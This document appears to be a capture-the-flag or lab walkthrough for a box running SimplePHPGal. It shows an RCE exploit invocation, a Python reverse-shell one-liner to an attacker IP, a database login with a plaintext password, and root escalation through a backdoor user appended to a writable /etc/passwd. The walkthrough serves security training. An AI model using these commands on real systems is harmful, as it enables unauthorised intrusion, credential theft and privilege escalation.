# 445 SMB
Found an unusual print$ share![](attachment/fda384114bc2141b87ea93b2f8b015ca.png)

# 80
![](attachment/699300a4a9c52f2344d113579854329a.png)
Website on port 80

So searching for exploits for this we end up with:
https://github.com/beauknowstech/SimplePHPGal-RCE.py
Now using it we didnt get a shell on most ports but port 21 works.
```bash
python3 SimplePHPGal-RCE.py http://192.168.195.58/ 192.168.45.236 21
```
![](attachment/1a0865989606323e3cbf892a2d14bde3.png)
Found 
![](attachment/04f6dfd74d0dd8a319eed92885987e41.png)

Then using another shell to get a stable shell:
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.236",21));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```
Now conencting to mysql:
```
mysql -h 127.0.0.1 -u root -pMalapropDoffUtilize1337 SimplePHPGal
```
now checking tables:
```
show tables;
select * from users;
```
![](attachment/70aafe860f4e053c6b032a7cce7558be.png)

Now base64 decoding twice:
![](attachment/62608841d7264dca2a226ce10e27a5df.png)

Now we can use this to ssh:
![](attachment/c89312f9c4e1757a07dc351f2ec1949a.png)

Then running linpeas we find writeable /etc/passwd:
![](attachment/35ecc8e7a411cee3bceae2ba2f3b1c6e.png)
So adding our own user:
```
openssl passwd 123
```
Now using this hash:
```
echo 'user3:SuIRCvQhtnOd6:0:0:root:/root:/bin/bash' >> /etc/passwd
```
![](attachment/2f83b4068b2c42d25bdaf4a20c13e163.png)

We can switch to our root user:
```
su user3
123
```
![](attachment/733d9c28251f5b2cdc31ba97578650c7.png)
